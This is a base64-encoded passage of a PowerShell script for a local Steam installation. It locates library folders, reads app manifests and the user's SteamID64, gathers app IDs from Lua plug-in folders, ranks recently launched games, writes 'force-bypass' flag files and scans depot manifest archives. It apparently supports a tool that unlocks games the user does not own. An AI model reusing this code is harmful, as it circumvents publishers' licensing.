9CiAgdHJ5IHsKICAgIGlmIChbU3lzdGVtLklPLkRpcmVjdG9yeV06OkV4aXN0cygkUGF0aCkpIHsgcmV0dXJuICR0cnVlIH0KICAgIGlmIChbU3lzdGVtLklPLkZpbGVdOjpFeGlzdHMoJFBhdGgpKSB7IHJldHVybiAkdHJ1ZSB9CiAgfSBjYXRjaCB7fQogIHJldHVybiAkZmFsc2UKfQoKZnVuY3Rpb24gR2V0LUxpYnJhcnlQYXRocyhbc3RyaW5nXSRTdGVhbVJvb3QpIHsKICAkcGF0aHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogIFt2b2lkXSRwYXRocy5BZGQoJFN0ZWFtUm9vdCkKICAkdmRmID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgInN0ZWFtYXBwc1xsaWJyYXJ5Zm9sZGVycy52ZGYiCiAgaWYgKC1ub3QgKFRlc3QtU3RlYW1Gc1BhdGggJHZkZikpIHsgcmV0dXJuICRwYXRocyB9CiAgdHJ5IHsKICAgICRyYXcgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsVGV4dCgkdmRmKQogICAgZm9yZWFjaCAoJG0gaW4gW3JlZ2V4XTo6TWF0Y2hlcygkcmF3LCAnInBhdGgiXHMqIihbXiJdKykiJykpIHsKICAgICAgJHAgPSAoJG0uR3JvdXBzWzFdLlZhbHVlIC1yZXBsYWNlICdcXFxcJywgJ1xcJykuVHJpbSgpCiAgICAgIGlmICgkcCAtYW5kIChUZXN0LVN0ZWFtRnNQYXRoICRwKSkgeyBbdm9pZF0kcGF0aHMuQWRkKCRwKSB9CiAgICB9CiAgfSBjYXRjaCB7fQogIHJldHVybiAkcGF0aHMKfQoKZnVuY3Rpb24gR2V0LVN0ZWFtSWQ2NChbc3RyaW5nXSRTdGVhbVJvb3QpIHsKICAkdmRmID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgImNvbmZpZ1xsb2dpbnVzZXJzLnZkZiIKICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkdmRmKSkgeyByZXR1cm4gJG51bGwgfQogIHRyeSB7CiAgICAkcmF3ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoJHZkZikKICAgICRibG9ja3MgPSBbcmVnZXhdOjpNYXRjaGVzKCRyYXcsICciKFxkezE3fSkiXHMqXHsoW159XSopXH0nKQogICAgJGJlc3RJZCA9ICRudWxsCiAgICAkYmVzdFJlY2VudCA9ICRmYWxzZQogICAgZm9yZWFjaCAoJGJsb2NrIGluICRibG9ja3MpIHsKICAgICAgJGlkID0gJGJsb2NrLkdyb3Vwc1sxXS5WYWx1ZQogICAgICAkYm9keSA9ICRibG9jay5Hcm91cHNbMl0uVmFsdWUKICAgICAgJHJlY2VudCA9ICRib2R5IC1tYXRjaCAnIk1vc3RSZWNlbnQiXHMqIjEiJwogICAgICBpZiAoLW5vdCAkYmVzdElkIC1vciAoJHJlY2VudCAtYW5kIC1ub3QgJGJlc3RSZWNlbnQpKSB7CiAgICAgICAgJGJlc3RJZCA9ICRpZAogICAgICAgICRiZXN0UmVjZW50ID0gW2Jvb2xdJHJlY2VudAogICAgICB9CiAgICB9CiAgICByZXR1cm4gJGJlc3RJZAogIH0gY2F0Y2ggewogICAgcmV0dXJuICRudWxsCiAgfQp9CgpmdW5jdGlvbiBHZXQtR2FtZURpcihbc3RyaW5nXSRTdGVhbVJvb3QsIFtzdHJpbmddJEFwcElkKSB7CiAgZm9yZWFjaCAoJGxpYiBpbiAoR2V0LUxpYnJhcnlQYXRocyAkU3RlYW1Sb290KSkgewogICAgJGFjZiA9IEpvaW4tUGF0aCAkbGliICgic3RlYW1hcHBzXGFwcG1hbmlmZXN0X3swfS5hY2YiIC1mICRBcHBJZCkKICAgIGlmICgtbm90IChUZXN0LVN0ZWFtRnNQYXRoICRhY2YpKSB7IGNvbnRpbnVlIH0KICAgIHRyeSB7CiAgICAgICRyYXcgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsVGV4dCgkYWNmKQogICAgICAkbSA9IFtyZWdleF06Ok1hdGNoKCRyYXcsICciaW5zdGFsbGRpciJccyoiKFteIl0rKSInKQogICAgICBpZiAoJG0uU3VjY2VzcykgewogICAgICAgICRkaXIgPSBKb2luLVBhdGggJGxpYiAoInN0ZWFtYXBwc1xjb21tb25cezB9IiAtZiAkbS5Hcm91cHNbMV0uVmFsdWUpCiAgICAgICAgaWYgKFRlc3QtU3RlYW1Gc1BhdGggJGRpcikgeyByZXR1cm4gJGRpciB9CiAgICAgIH0KICAgIH0gY2F0Y2gge30KICB9CiAgcmV0dXJuICRudWxsCn0KCmZ1bmN0aW9uIEdldC1HYW1lRGlzcGxheU5hbWUoW3N0cmluZ10kU3RlYW1Sb290LCBbc3RyaW5nXSRBcHBJZCkgewogIGZvcmVhY2ggKCRsaWIgaW4gKEdldC1MaWJyYXJ5UGF0aHMgJFN0ZWFtUm9vdCkpIHsKICAgICRhY2YgPSBKb2luLVBhdGggJGxpYiAoInN0ZWFtYXBwc1xhcHBtYW5pZmVzdF97MH0uYWNmIiAtZiAkQXBwSWQpCiAgICBpZiAoLW5vdCAoVGVzdC1TdGVhbUZzUGF0aCAkYWNmKSkgeyBjb250aW51ZSB9CiAgICB0cnkgewogICAgICAkcmF3ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoJGFjZikKICAgICAgJG0gPSBbcmVnZXhdOjpNYXRjaCgkcmF3LCAnIm5hbWUiXHMqIihbXiJdKykiJykKICAgICAgaWYgKCRtLlN1Y2Nlc3MgLWFuZCAkbS5Hcm91cHNbMV0uVmFsdWUuVHJpbSgpKSB7CiAgICAgICAgcmV0dXJuICRtLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCkKICAgICAgfQogICAgfSBjYXRjaCB7fQogIH0KICAkZGlyID0gR2V0LUdhbWVEaXIgJFN0ZWFtUm9vdCAkQXBwSWQKICBpZiAoJGRpcikgeyByZXR1cm4gKFNwbGl0LVBhdGggJGRpciAtTGVhZikgfQogIHJldHVybiAoIkFwcCAiICsgJEFwcElkKQp9CgpmdW5jdGlvbiBHZXQtU2hhZG93S2V5c0FwcElkcyhbc3RyaW5nXSRTdGVhbVJvb3QsIFtzdHJpbmddJFN0ZWFtSWQ2NCkgewogICRpZHMgPSBOZXctT2JqZWN0ICdTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5IYXNoU2V0W3N0cmluZ10nCiAgaWYgKCRTdGVhbUlkNjQpIHsKICAgICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFN0ZWFtUm9vdCAoIm9wZW5zdGVhbXRvb2xcY2xpZW50XHswfS5zayIgLWYgJFN0ZWFtSWQ2NCkKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgpIHsKICAgICAgdHJ5IHsKICAgICAgICBmb3JlYWNoICgkbSBpbiBbcmVnZXhdOjpNYXRjaGVzKFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRzdGF0ZVBhdGgpLCAnIihcZHszLDEwfSkiXHMqOicpKSB7CiAgICAgICAgICBbdm9pZF0kaWRzLkFkZCgkbS5Hcm91cHNbMV0uVmFsdWUpCiAgICAgICAgfQogICAgICB9IGNhdGNoIHt9CiAgICB9CiAgfQogIGZvcmVhY2ggKCRsdWFEaXIgaW4gQCgKICAgIChKb2luLVBhdGggJFN0ZWFtUm9vdCAiY29uZmlnXGx1YSIpLAogICAgKEpvaW4tUGF0aCAkU3RlYW1Sb290ICJjb25maWdcc3RwbHVnLWluIikKICApKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkbHVhRGlyKSkgeyBjb250aW51ZSB9CiAgICBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkbHVhRGlyIC1GaWx0ZXIgIioubHVhIiAtRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgaWYgKCRfLkJhc2VOYW1lIC1tYXRjaCAnXlswLTldKyQnKSB7IFt2b2lkXSRpZHMuQWRkKCRfLkJhc2VOYW1lKSB9CiAgICB9CiAgfQogIHJldHVybiBAKCRpZHMgfCBTb3J0LU9iamVjdCB7IFtpbnRdJF8gfSkKfQoKZnVuY3Rpb24gVGVzdC1BcHBJbnN0YWxsZWQoW3N0cmluZ10kU3RlYW1Sb290LCBbc3RyaW5nXSRBcHBJZCkgewogIGZvcmVhY2ggKCRsaWIgaW4gKEdldC1MaWJyYXJ5UGF0aHMgJFN0ZWFtUm9vdCkpIHsKICAgICRhY2YgPSBKb2luLVBhdGggJGxpYiAoInN0ZWFtYXBwc1xhcHBtYW5pZmVzdF97MH0uYWNmIiAtZiAkQXBwSWQpCiAgICBpZiAoLW5vdCAoVGVzdC1TdGVhbUZzUGF0aCAkYWNmKSkgeyBjb250aW51ZSB9CiAgICB0cnkgewogICAgICAkcmF3ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoJGFjZikKICAgICAgaWYgKCRyYXcgLW1hdGNoICciU3RhdGVGbGFncyJccyoiKFxkKykiJykgewogICAgICAgICRmbGFncyA9IFtpbnRdJE1hdGNoZXNbMV0KICAgICAgICBpZiAoKCRmbGFncyAtYmFuZCA0KSAtbmUgMCkgeyByZXR1cm4gJHRydWUgfQogICAgICB9CiAgICAgIGlmICgkcmF3IC1tYXRjaCAnImluc3RhbGxkaXIiXHMqIihbXiJdKykiJykgewogICAgICAgICRkaXIgPSBKb2luLVBhdGggJGxpYiAoInN0ZWFtYXBwc1xjb21tb25cIiArICRNYXRjaGVzWzFdKQogICAgICAgIGlmIChUZXN0LVN0ZWFtRnNQYXRoICRkaXIpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgfQogICAgfSBjYXRjaCB7fQogIH0KICByZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIFNldC1MYXVuY2hSZWNlbmN5U2NvcmUgewogIHBhcmFtKAogICAgJFNjb3JlcywKICAgIFtzdHJpbmddJEFwcElkLAogICAgW2ludDY0XSRVbml4CiAgKQogIGlmICgtbm90ICRBcHBJZCAtb3IgJFVuaXggLWxlIDApIHsgcmV0dXJuIH0KICBpZiAoLW5vdCAkU2NvcmVzLkNvbnRhaW5zS2V5KCRBcHBJZCkgLW9yICRVbml4IC1ndCAkU2NvcmVzWyRBcHBJZF0pIHsKICAgICRTY29yZXNbJEFwcElkXSA9ICRVbml4CiAgfQp9CgpmdW5jdGlvbiBDb252ZXJ0LUxhdW5jaFRyYWNlVGltZXN0YW1wKFtzdHJpbmddJFRleHQpIHsKICB0cnkgewogICAgJGR0ID0gW0RhdGVUaW1lXTo6UGFyc2VFeGFjdCgkVGV4dCwgInl5eXktTU0tZGQgSEg6bW06c3MiLCAkbnVsbCkKICAgIHJldHVybiBbRGF0ZVRpbWVPZmZzZXRdOjpuZXcoJGR0KS5Ub1VuaXhUaW1lU2Vjb25kcygpCiAgfSBjYXRjaCB7CiAgICByZXR1cm4gMEwKICB9Cn0KCmZ1bmN0aW9uIFJlYWQtVGV4dEZpbGVTaGFyZWQoW3N0cmluZ10kUGF0aCkgewogIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRQYXRoKSkgeyByZXR1cm4gJG51bGwgfQogIHRyeSB7CiAgICAkZnMgPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuKCRQYXRoLCBbU3lzdGVtLklPLkZpbGVNb2RlXTo6T3BlbiwgW1N5c3RlbS5JTy5GaWxlQWNjZXNzXTo6UmVhZCwgW1N5c3RlbS5JTy5GaWxlU2hhcmVdOjpSZWFkV3JpdGUpCiAgICB0cnkgewogICAgICAkc3IgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJGZzLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LCAkdHJ1ZSkKICAgICAgdHJ5IHsgcmV0dXJuICRzci5SZWFkVG9FbmQoKSB9IGZpbmFsbHkgeyAkc3IuRGlzcG9zZSgpIH0KICAgIH0gZmluYWxseSB7ICRmcy5EaXNwb3NlKCkgfQogIH0gY2F0Y2ggewogICAgdHJ5IHsgcmV0dXJuIFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRQYXRoKSB9IGNhdGNoIHsgcmV0dXJuICRudWxsIH0KICB9Cn0KCmZ1bmN0aW9uIEdldC1MYXVuY2hSZWNlbmN5U2NvcmVzIHsKICBwYXJhbShbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRTdGVhbVJvb3QpCiAgJHNjb3JlcyA9IEB7fQogICRsYXVuY2hUcmFjZSA9IEpvaW4tUGF0aCAkU3RlYW1Sb290ICJvcGVuc3RlYW10b29sXGxhdW5jaC10cmFjZS5sb2ciCiAgJHJhdyA9IFJlYWQtVGV4dEZpbGVTaGFyZWQgJGxhdW5jaFRyYWNlCiAgaWYgKCRyYXcpIHsKICAgIGZvcmVhY2ggKCRtIGluIFtyZWdleF06Ok1hdGNoZXMoJHJhdywgJ1xbKFxkezR9LVxkezJ9LVxkezJ9IFxkezJ9OlxkezJ9OlxkezJ9KVxdXHMqU3Bhd25Qcm9jZXNzIGFwcGlkPShcZCspJykpIHsKICAgICAgU2V0LUxhdW5jaFJlY2VuY3lTY29yZSAtU2NvcmVzICRzY29yZXMgLUFwcElkICRtLkdyb3Vwc1syXS5WYWx1ZSAtVW5peCAoQ29udmVydC1MYXVuY2hUcmFjZVRpbWVzdGFtcCAkbS5Hcm91cHNbMV0uVmFsdWUpCiAgICB9CiAgfQogICRsb2dzRGlyID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgImxvZ3MiCiAgZm9yZWFjaCAoJG5hbWUgaW4gQCgnY29udGVudF9sb2cudHh0JywgJ2NvbnRlbnRfbG9nLnByZXZpb3VzLnR4dCcpKSB7CiAgICAkcmF3ID0gUmVhZC1UZXh0RmlsZVNoYXJlZCAoSm9pbi1QYXRoICRsb2dzRGlyICRuYW1lKQogICAgaWYgKC1ub3QgJHJhdykgeyBjb250aW51ZSB9CiAgICBmb3JlYWNoICgkbSBpbiBbcmVnZXhdOjpNYXRjaGVzKCRyYXcsICdcWyhcZHs0fS1cZHsyfS1cZHsyfSBcZHsyfTpcZHsyfTpcZHsyfSlcXVxzKkZhaWxlZCBydW5uaW5nIGFwcCAoXGQrKSBcKG1pc3NpbmcgZXhlY3V0YWJsZScpKSB7CiAgICAgIFNldC1MYXVuY2hSZWNlbmN5U2NvcmUgLVNjb3JlcyAkc2NvcmVzIC1BcHBJZCAkbS5Hcm91cHNbMl0uVmFsdWUgLVVuaXggKENvbnZlcnQtTGF1bmNoVHJhY2VUaW1lc3RhbXAgJG0uR3JvdXBzWzFdLlZhbHVlKQogICAgfQogIH0KICBmb3JlYWNoICgkbmFtZSBpbiBAKCdjb25zb2xlX2xvZy50eHQnLCAnY29uc29sZV9sb2cucHJldmlvdXMudHh0JykpIHsKICAgICRyYXcgPSBSZWFkLVRleHRGaWxlU2hhcmVkIChKb2luLVBhdGggJGxvZ3NEaXIgJG5hbWUpCiAgICBpZiAoLW5vdCAkcmF3KSB7IGNvbnRpbnVlIH0KICAgIGZvcmVhY2ggKCRtIGluIFtyZWdleF06Ok1hdGNoZXMoJHJhdywgJ1xbKFxkezR9LVxkezJ9LVxkezJ9IFxkezJ9OlxkezJ9OlxkezJ9KVxdXHMqR2FtZUFjdGlvbiBcW0FwcElEIChcZCspW15cXV0qXF1ccyo6XHMqTGF1bmNoQXBwJykpIHsKICAgICAgU2V0LUxhdW5jaFJlY2VuY3lTY29yZSAtU2NvcmVzICRzY29yZXMgLUFwcElkICRtLkdyb3Vwc1syXS5WYWx1ZSAtVW5peCAoQ29udmVydC1MYXVuY2hUcmFjZVRpbWVzdGFtcCAkbS5Hcm91cHNbMV0uVmFsdWUpCiAgICB9CiAgfQogIGZvcmVhY2ggKCRsaWIgaW4gKEdldC1MaWJyYXJ5UGF0aHMgJFN0ZWFtUm9vdCkpIHsKICAgICRhcHBzRGlyID0gSm9pbi1QYXRoICRsaWIgInN0ZWFtYXBwcyIKICAgIGlmICgtbm90IChUZXN0LVN0ZWFtRnNQYXRoICRhcHBzRGlyKSkgeyBjb250aW51ZSB9CiAgICBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYXBwc0RpciAtRmlsdGVyICJhcHBtYW5pZmVzdF8qLmFjZiIgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgIGlmICgkXy5CYXNlTmFtZSAtbm90bWF0Y2ggJ15hcHBtYW5pZmVzdF8oXGQrKSQnKSB7IHJldHVybiB9CiAgICAgICRhcHBJZCA9ICRNYXRjaGVzWzFdCiAgICAgICRhY2ZSYXcgPSBSZWFkLVRleHRGaWxlU2hhcmVkICRfLkZ1bGxOYW1lCiAgICAgIGlmICgtbm90ICRhY2ZSYXcpIHsgcmV0dXJuIH0KICAgICAgJGxwID0gW3JlZ2V4XTo6TWF0Y2goJGFjZlJhdywgJyJMYXN0UGxheWVkIlxzKiIoXGQrKSInKQogICAgICBpZiAoJGxwLlN1Y2Nlc3MpIHsKICAgICAgICBTZXQtTGF1bmNoUmVjZW5jeVNjb3JlIC1TY29yZXMgJHNjb3JlcyAtQXBwSWQgJGFwcElkIC1Vbml4IChbaW50NjRdJGxwLkdyb3Vwc1sxXS5WYWx1ZSkKICAgICAgfQogICAgfQogIH0KICByZXR1cm4gJHNjb3Jlcwp9CgpmdW5jdGlvbiBHZXQtQnlwYXNzUmVwYWlyU2NvcmUgewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RlYW1Sb290LAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kQXBwSWQsCiAgICAkTGF1bmNoU2NvcmVzID0gJG51bGwKICApCiAgaWYgKC1ub3QgJExhdW5jaFNjb3JlcykgeyAkTGF1bmNoU2NvcmVzID0gR2V0LUxhdW5jaFJlY2VuY3lTY29yZXMgJFN0ZWFtUm9vdCB9CiAgaWYgKCRMYXVuY2hTY29yZXMuQ29udGFpbnNLZXkoJEFwcElkKSkgewogICAgcmV0dXJuIFtpbnQ2NF0kTGF1bmNoU2NvcmVzWyRBcHBJZF0KICB9CiAgJHRvdWNoID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgKCJvcGVuc3RlYW10b29sXGJ5cGFzcy1yZWNlbnRcezB9LnRvdWNoIiAtZiAkQXBwSWQpCiAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHRvdWNoKSB7CiAgICB0cnkgewogICAgICAkcmF3ID0gKFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCR0b3VjaCkpLlRyaW0oKQogICAgICBpZiAoJHJhdyAtbWF0Y2ggJ15bMC05XSskJykgeyByZXR1cm4gW2ludDY0XSRyYXcgfQogICAgfSBjYXRjaCB7fQogIH0KICByZXR1cm4gMEwKfQoKZnVuY3Rpb24gU29ydC1JbnN0YWxsZWRCeXBhc3NBcHBzIHsKICBwYXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJFN0ZWFtUm9vdCwKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmdbXV0kQXBwSWRzCiAgKQogICRsYXVuY2hTY29yZXMgPSBHZXQtTGF1bmNoUmVjZW5jeVNjb3JlcyAkU3RlYW1Sb290CiAgcmV0dXJuIEAoJEFwcElkcyB8IFNvcnQtT2JqZWN0IC1EZXNjZW5kaW5nIHsKICAgIEdldC1CeXBhc3NSZXBhaXJTY29yZSAtU3RlYW1Sb290ICRTdGVhbVJvb3QgLUFwcElkICRfIC1MYXVuY2hTY29yZXMgJGxhdW5jaFNjb3JlcwogIH0sIHsKICAgIFtpbnRdJF8KICB9KQp9CgpmdW5jdGlvbiBHZXQtUmVjZW50UGxheWVkQXBwSWRzIHsKICBwYXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJFN0ZWFtUm9vdCwKICAgIFtpbnRdJExpbWl0ID0gMywKICAgIFtzdHJpbmddJFN0ZWFtSWQ2NCA9ICRudWxsCiAgKQogIGlmICgkTGltaXQgLWx0IDEpIHsgcmV0dXJuIEAoKSB9CiAgaWYgKC1ub3QgJFN0ZWFtSWQ2NCkgeyAkU3RlYW1JZDY0ID0gR2V0LVN0ZWFtSWQ2NCAkU3RlYW1Sb290IH0KICBpZiAoLW5vdCAkU3RlYW1JZDY0KSB7IHJldHVybiBAKCkgfQogICRhbGxJZHMgPSBHZXQtU2hhZG93S2V5c0FwcElkcyAkU3RlYW1Sb290ICRTdGVhbUlkNjQKICAkaW5zdGFsbGVkID0gQCgkYWxsSWRzIHwgV2hlcmUtT2JqZWN0IHsgVGVzdC1BcHBJbnN0YWxsZWQgJFN0ZWFtUm9vdCAkXyB9KQogIGlmICgkaW5zdGFsbGVkLkNvdW50IC1lcSAwKSB7IHJldHVybiBAKCkgfQogICRsYXVuY2hTY29yZXMgPSBHZXQtTGF1bmNoUmVjZW5jeVNjb3JlcyAkU3RlYW1Sb290CiAgJHNvcnRlZCA9IFNvcnQtSW5zdGFsbGVkQnlwYXNzQXBwcyAtU3RlYW1Sb290ICRTdGVhbVJvb3QgLUFwcElkcyAkaW5zdGFsbGVkCiAgJHJlY2VudCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgZm9yZWFjaCAoJGFwcElkIGluICRzb3J0ZWQpIHsKICAgICRzY29yZSA9IEdldC1CeXBhc3NSZXBhaXJTY29yZSAtU3RlYW1Sb290ICRTdGVhbVJvb3QgLUFwcElkICRhcHBJZCAtTGF1bmNoU2NvcmVzICRsYXVuY2hTY29yZXMKICAgIGlmICgkc2NvcmUgLWxlIDApIHsgY29udGludWUgfQogICAgW3ZvaWRdJHJlY2VudC5BZGQoW3N0cmluZ10kYXBwSWQpCiAgICBpZiAoJHJlY2VudC5Db3VudCAtZ2UgJExpbWl0KSB7IGJyZWFrIH0KICB9CiAgcmV0dXJuIEAoJHJlY2VudCkKfQoKZnVuY3Rpb24gV3JpdGUtRm9yY2VCeXBhc3NGbGFnKFtzdHJpbmddJFN0ZWFtUm9vdCwgW3N0cmluZ10kQXBwSWQpIHsKICAkb3N0RGlyID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgIm9wZW5zdGVhbXRvb2wiCiAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJG9zdERpcikpIHsKICAgIE5ldy1JdGVtIC1QYXRoICRvc3REaXIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgfCBPdXQtTnVsbAogIH0KICAkZmxhZyA9IEpvaW4tUGF0aCAkb3N0RGlyICgiZm9yY2UtYnlwYXNzLXswfS5mbGFnIiAtZiAkQXBwSWQpCiAgJHRzID0gW3N0cmluZ11bRGF0ZVRpbWVPZmZzZXRdOjpOb3cuVG9Vbml4VGltZVNlY29uZHMoKQogIHRyeSB7CiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZsYWcgLVZhbHVlICR0cyAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlCiAgICByZXR1cm4gJHRydWUKICB9IGNhdGNoIHsKICAgIHJldHVybiAkZmFsc2UKICB9Cn0KCmZ1bmN0aW9uIEdldC1TdGVhbVBhdGhGcm9tUmVnaXN0cnkgewogIGZvcmVhY2ggKCRrZXkgaW4gQCgKICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxWYWx2ZVxTdGVhbScsCiAgICAnSEtMTTpcU09GVFdBUkVcVmFsdmVcU3RlYW0nLAogICAgJ0hLQ1U6XFNvZnR3YXJlXFZhbHZlXFN0ZWFtJwogICkpIHsKICAgIHRyeSB7CiAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5IC1FcnJvckFjdGlvbiBTdG9wCiAgICAgIGlmICgkcHJvcC5JbnN0YWxsUGF0aCAtYW5kIChUZXN0LVBhdGggJHByb3AuSW5zdGFsbFBhdGgpKSB7IHJldHVybiAkcHJvcC5JbnN0YWxsUGF0aCB9CiAgICAgIGlmICgkcHJvcC5TdGVhbVBhdGggLWFuZCAoVGVzdC1QYXRoICRwcm9wLlN0ZWFtUGF0aCkpIHsgcmV0dXJuICRwcm9wLlN0ZWFtUGF0aCB9CiAgICB9IGNhdGNoIHt9CiAgfQogIHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBHZXQtTHVhTWFuaWZlc3REaXJzKFtzdHJpbmddJFN0ZWFtUm9vdCkgewogIHJldHVybiBAKAogICAgKEpvaW4tUGF0aCAkU3RlYW1Sb290ICJjb25maWdcbHVhIiksCiAgICAoSm9pbi1QYXRoICRTdGVhbVJvb3QgImNvbmZpZ1xzdHBsdWctaW4iKQogICkKfQoKZnVuY3Rpb24gRW5zdXJlLUx1YU1hbmlmZXN0RGlyKFtzdHJpbmddJERpcikgewogIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICREaXIpKSB7CiAgICBOZXctSXRlbSAtUGF0aCAkRGlyIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIHwgT3V0LU51bGwKICB9CiAgcmV0dXJuICREaXIKfQoKZnVuY3Rpb24gRXhwYW5kLUh1YmNhcFppcEFyY2hpdmUgewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kQXJjaGl2ZVBhdGgsCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSREZXN0aW5hdGlvblBhdGgKICApCiAgdHJ5IHsKICAgIEV4cGFuZC1BcmNoaXZlIC1MaXRlcmFsUGF0aCAkQXJjaGl2ZVBhdGggLURlc3RpbmF0aW9uUGF0aCAkRGVzdGluYXRpb25QYXRoIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU3RvcAogICAgcmV0dXJuICR0cnVlCiAgfSBjYXRjaCB7fQogIHRyeSB7CiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5JTy5Db21wcmVzc2lvbi5GaWxlU3lzdGVtIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBbU3lzdGVtLklPLkNvbXByZXNzaW9uLlppcEZpbGVdOjpFeHRyYWN0VG9EaXJlY3RvcnkoJEFyY2hpdmVQYXRoLCAkRGVzdGluYXRpb25QYXRoKQogICAgcmV0dXJuICR0cnVlCiAgfSBjYXRjaCB7fQogIHJldHVybiAkZmFsc2UKfQoKZnVuY3Rpb24gR2V0LUh1YmNhcFppcE1hbmlmZXN0RGVwb3RJZHMgewogIHBhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJEFyY2hpdmVQYXRoKQogICRkZXBvdElkcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSGFzaFNldFtzdHJpbmddCiAgJHN0YWdlID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoInNrLWh1YmNhcC1zY2FuLSIgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQogIHRyeSB7CiAgICBOZXctSXRlbSAtUGF0aCAkc3RhZ2UgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgfCBPdXQtTnVsbAogICAgaWYgKC1ub3QgKEV4cGFuZC1IdWJjYXBaaXBBcmNoaXZlIC1BcmNoaXZlUGF0aCAkQXJjaGl2ZVBhdGggLURlc3RpbmF0aW9uUGF0aCAkc3RhZ2UpKSB7IHJldHVybiBAKCkgfQogICAgZm9yZWFjaCAoJG1hbmlmZXN0RmlsZSBpbiBAKEdldC1DaGlsZEl0ZW0gLUxpdGVyYWxQYXRoICRzdGFnZSAtUmVjdXJzZSAtRmlsdGVyICcqLm1hbmlmZXN0JyAtRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgaWYgKCRtYW5pZmVzdEZpbGUuTmFtZSAtbWF0Y2ggJ14oXGQrKV8nKSB7CiAgICAgICAgW3ZvaWRdJGRlcG90SWRzLkFkZCgkTWF0Y2hlc1sxXSkKICAgICAgfQogICAgfQogIH0gY2F0Y2ggewogIH0gZmluYWxseSB7CiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkc3RhZ2UpIHsKICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRzdGFnZSAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KICB9CiAgcmV0dXJuIEAoJGRlcG90SWRzKQp9CgpmdW5jdGlvbiBDbGVhci1TdGVhbUFwcEh1YmNhcFN0YXRlIHsKICBwYXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJFN0Z